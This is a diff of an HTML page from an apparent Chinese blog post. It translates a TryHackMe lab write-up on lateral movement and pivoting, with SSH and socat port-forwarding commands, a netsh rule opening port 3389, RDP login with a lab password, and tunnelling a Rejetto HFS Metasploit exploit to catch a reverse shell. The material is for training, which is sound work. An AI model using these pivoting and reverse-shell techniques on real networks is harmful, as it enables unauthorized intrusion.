 <p>此时可能会出现的一个有效问题是，如果我们已经破坏了 PC-1 并且可以直接从那里运行 RDP 会话，为什么我们需要端口转发。答案很简单：在我们只能通过控制台访问 PC-1 的情况下，我们将无法使用任何 RDP 客户端，因为我们没有 GUI。通过使攻击者的计算机可以使用该端口，您可以使用 Linux RDP 客户端进行连接。当您想要针对无法直接访问的端口运行漏洞利用时，会出现类似的情况，因为您的漏洞利用可能需要特定的脚本语言，而这种语言可能并不总是在您妥协的计算机上可用。</p>
 <p>参考上图，要将服务器上的端口 3389 转发回攻击者的计算机，我们可以在 PC-1 上使用以下命令：</p>
 <pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -R <span class="hljs-number">3389</span>:<span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span>:<span class="hljs-number">3389</span> -N</code></pre>
@@ -661,7 +737,7 @@ passwd tunneluser</code></pre>
 <h2 id="ssh-本地端口转发">SSH 本地端口转发</h2>
 <p>本地端口转发允许我们将端口从 SSH 服务器“拉”到 SSH 客户端。在我们的场景中，这可用于获取攻击者计算机中可用的任何服务，并通过 PC-1 上的端口使其可用。这样，任何无法直接连接到攻击者 PC 但可以连接到 PC-1 的主机现在都可以通过枢轴主机访问攻击者的服务。</p>
 <p>使用这种类型的端口转发将允许我们从通常无法连接回我们的主机上运行反向 shell，或者仅仅是使我们想要的任何服务对于没有直接连接到我们的机器的机器可用。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204345929.png" alt="image-20240216204345929"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204345929.png" alt="image-20240216204345929"></p>
 <p>要从攻击者的计算机转发端口 80 并使其可从 PC-1 访问，我们可以在 PC-1 上运行以下命令：</p>
 <pre><code class="hljs scss">ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -L *:<span class="hljs-number">80</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> -N</code></pre>
 <p>该命令结构与远程端口转发中使用的命令结构类似，但使用 <code>-L</code> 选项进行本地端口转发。此选项要求我们指示 PC-1 用于接收连接的本地套接字 ( <code>*:80</code> ) 以及从攻击者的 PC 角度连接的远程套接字 ( <code>127.0.0.1:80</code> )。</p>
@@ -677,13 +753,13 @@ passwd tunneluser</code></pre>
 <p>回到我们的示例，如果我们想像使用 SSH 远程端口转发一样使用 PC-1 作为枢纽来访问服务器上的端口 3389，我们可以使用以下命令：</p>
 <pre><code class="hljs scss">C:\&gt;socat TCP4-LISTEN:<span class="hljs-number">3389</span>,fork TCP4:<span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span>:<span class="hljs-number">3389</span></code></pre>
 <p>请注意，socat 无法像 SSH 那样将连接直接转发到攻击者的计算机，但会在 PC-1 上打开一个端口，攻击者的计算机随后可以连接到该端口：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204530374.png" alt="image-20240216204530374"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204530374.png" alt="image-20240216204530374"></p>
 <p>像往常一样，由于在枢轴主机上打开了一个端口，我们可能需要创建一个防火墙规则以允许到该端口的任何连接：</p>
 <pre><code class="hljs scss">netsh advfirewall firewall add rule name="Open Port <span class="hljs-number">3389</span>" dir=in action=allow protocol=TCP localport=<span class="hljs-number">3389</span></code></pre>
 <p>另一方面，如果我们想从攻击者的机器公开端口 80，以便服务器可以访问它，我们只需要稍微调整一下命令：</p>
 <pre><code class="hljs scss">C:\&gt;socat TCP4-LISTEN:<span class="hljs-number">80</span>,fork TCP4:<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">80</span></code></pre>
 <p>结果，PC-1 将生成端口 80 并侦听要转发到攻击者计算机上的端口 80 的连接：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204552262.png" alt="image-20240216204552262"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204552262.png" alt="image-20240216204552262"></p>
 <h2 id="动态端口转发和-socks">动态端口转发和 SOCKS</h2>
 <p>虽然单端口转发对于需要访问特定套接字的任务非常有效，但有时我们可能需要通过枢轴主机对主机的许多端口甚至跨多台计算机的许多端口运行扫描。在这些情况下，动态端口转发允许我们通过主机进行旋转，并使用 SOCKS 代理与我们想要的任何 IP 地址/端口建立多个连接。</p>
 <p>由于我们不想依赖目标网络中 Windows 计算机上现有的 SSH 服务器，因此我们通常会使用 SSH 客户端通过以下命令建立反向动态端口转发：</p>
@@ -705,27 +781,27 @@ socks4  <span class="hljs-number">127.0</span><span class="hljs-selector-class">
 <p>为此，我们将使用以下参数运行 socat：</p>
 <pre><code class="hljs scss">C:\tools\socat\&gt;socat TCP4-LISTEN:<span class="hljs-number">3697</span>,fork TCP4:THMIIS.za.tryhackme.com:<span class="hljs-number">3389</span></code></pre>
 <p>请注意，我们不能将端口 3389 用于侦听器，因为它已在 THMJMP2 中用于其自己的 RDP 服务。请随意将侦听器端口 (13389) 更改为其他号码，以避免与其他学生发生冲突。在典型设置中，您必须添加防火墙规则以允许流量通过侦听器端口，但为了方便起见，THMJMP2 已禁用其防火墙。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205715457.png" alt="image-20240216205715457"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205715457.png" alt="image-20240216205715457"></p>
 <p>设置侦听器后，您应该能够通过 THMJMP2 处的 socat 侦听器通过 RDP 从攻击者计算机连接到 THMIIS：</p>
 <pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ xfreerdp /<span class="hljs-attribute">v</span>:THMJMP2.za.tryhackme.<span class="hljs-attribute">com</span>:<span class="hljs-number">3697</span> /<span class="hljs-attribute">u</span>:t1_thomas.moore /<span class="hljs-attribute">p</span>:MyPazzw3rd2020</code></pre>
 <p>连接后，您应该会从 THMIIS 上的 t1_thomas.moore 桌面上获得一个标志。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205818932.png" alt="image-20240216205818932"></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205806238.png" alt="image-20240216205806238"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205818932.png" alt="image-20240216205818932"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205806238.png" alt="image-20240216205806238"></p>
 <h3 id="隧道复杂漏洞">隧道复杂漏洞</h3>
 <p>THMDC 服务器正在运行 Rejetto HFS 的易受攻击版本。我们面临的问题是防火墙规则限制对易受攻击的端口的访问，因此只能从 THMJMP2 进行查看。此外，来自 THMDC 的出站连接仅允许其本地网络中的计算机进行，因此无法直接接收到攻击者计算机的反向 shell。更糟糕的是，Rejetto HFS 漏洞要求攻击者托管 HTTP 服务器来触发最终有效负载，但由于攻击者的计算机不允许出站连接，因此我们需要找到一种方法来托管 Web 服务器之一同一网络中的其他机器，这一点也不方便。我们可以使用端口转发来克服所有这些问题。</p>
 <p>首先，让我们看看该漏洞利用程序是如何工作的。首先，它将连接到 HFS 端口（Metasploit 中的 <code>RPORT</code> ）以触发第二个连接。第二个连接将在 <code>SRVPORT</code> 上针对攻击者的计算机进行，其中 Web 服务器将传递最终的有效负载。最后，攻击者的有效负载将在 <code>LPORT</code> 上执行并向攻击者发送回反向 shell：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205954150.png" alt="image-20240216205954150"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205954150.png" alt="image-20240216205954150"></p>
 <p>考虑到这一点，我们可以使用 SSH 将某些端口从攻击者的计算机转发到 THMJMP2（用于 Web 服务器的 SRVPORT 和用于接收反向 shell 的 LPORT），并通过 THMJMP2 到达 THMDC 上的 RPORT。我们需要在两个方向上进行三个端口转发，以便所有漏洞利用的交互都可以通过 THMJMP2 进行代理：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210148593.png" alt="image-20240216210148593"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210148593.png" alt="image-20240216210148593"></p>
 <p>Rejetto HFS 将侦听 THMDC 上的端口 80，因此我们需要使用远程端口转发通过 THMJMP2 将该端口隧道传回攻击者的计算机。由于攻击盒的 80 端口已被其他服务占用，因此我们需要将 THMDC 上的端口 80 与攻击盒当前未使用的某个端口链接起来。让我们使用端口 8888。在 THMJMP2 中运行 ssh 来转发此端口时，我们必须将 <code>-R 8888:thmdc.za.tryhackme.com:80</code> 添加到我们的命令中。</p>
 <p>对于SRVPORT和LPORT，我们随意选择两个随机端口。出于演示目的，我们将设置 <code>SRVPORT=6666</code> 和 <code>LPORT=7878</code> ，但请务必使用不同的端口，因为实验室与其他学生共享，因此如果你们两个选择相同的端口，当尝试转发它们时，您会收到一条错误消息，指出此类端口已在 THMJMP2 上使用。</p>
 <p>要将此类端口从攻击者计算机转发到 THMJMP2，我们将通过在 ssh 命令中添加 <code>-L *:6666:127.0.0.1:6666</code> 和 <code>-L *:7878:127.0.0.1:7878</code> 来使用本地端口转发。这将绑定 THMJMP2 上的两个端口，并将任何连接隧道返回到我们的攻击者计算机。</p>
 <p>将整个命令放在一起，我们最终会得到以下结果：</p>
 <pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span> -R <span class="hljs-number">8888</span>:thmdc.za.tryhackme.com:<span class="hljs-number">80</span> -L *:<span class="hljs-number">6666</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span> -L *:<span class="hljs-number">7878</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7878</span> -N</code></pre>
 <p>注意：如果您使用 AttackBox 并且之前加入过其他网络房间，请务必选择分配给面向 <code>lateralmovementandpivoting</code> 网络的隧道接口的 IP 地址作为您的 ATTACKER_IP，否则您的反向 shell/连接将获胜无法正常工作。为了您的方便，连接到该网络的接口称为 <code>lateralmovement</code> ，因此您应该能够通过运行 <code>ip add show lateralmovement</code> 获得正确的 IP 地址：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210318888.png" alt="image-20240216210318888"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210318888.png" alt="image-20240216210318888"></p>
 <p>一旦所有端口转发到位，我们就可以启动 Metasploit 并配置漏洞利用程序，以便所需的端口与我们通过 THMJMP2 转发的端口相匹配：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/3a9b9b89b41c2382a2c8645ab1c01a2f0e640df2/images/image-20240217120311538.png" alt="images/image-20240217120311538.png  0 → 100644"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/3a9b9b89b41c2382a2c8645ab1c01a2f0e640df2/images/image-20240217120311538.png" alt="images/image-20240217120311538.png  0 → 100644"></p>
 <p>这里有很多东西需要解压：</p>
 <ul>
 <li>LHOST参数通常有两个用途：作为攻击者机器上绑定监听器的IP，用于接收反向shell；它还嵌入在有效负载中，以便受害者知道在触发漏洞时从哪里进行连接。在我们的特定场景中，由于 THMDC 无法联系到我们，因此我们需要强制有效负载连接回 THMJMP2，但我们需要侦听器在 <code>127.0.0.1</code> 上绑定到攻击者的计算机。为此，Metasploit 提供了一个可选参数 <code>ReverseListenerBindAddress</code> ，该参数可用于指定攻击者机器上侦听器的绑定地址，与负载将连接回的地址分开。在我们的示例中，我们希望将反向 shell 侦听器绑定到攻击者计算机上的 127.0.0.1，并将有效负载连接回 THMJMP2（因为它将通过 SSH 隧道转发到攻击者计算机）。</li>
@@ -735,439 +811,270 @@ socks4  <span class="hljs-number">127.0</span><span class="hljs-selector-class">
 <p>启动该漏洞后，您将在攻击者的计算机上收到一个 shell。您会在 <code>C:\hfs\flag.txt</code> 上找到一个标志。</p>
 <h1 id="0x08-参考文章">0x08 参考文章</h1>
 <p><a target="_blank" rel="noopener" href="https://benheater.com/tryhackme-lateral-movement-pivoting/">TryHackMe | Lateral Movement &amp; Pivoting</a></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/')">THM-Lateral Movement and Pivoting</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Lateral Movement and Pivoting&amp;url=http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">36</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/14/thm-basic-pentesting/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Basic Pentesting</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/16/thm-nmap/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-Nmap</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.</span> <span 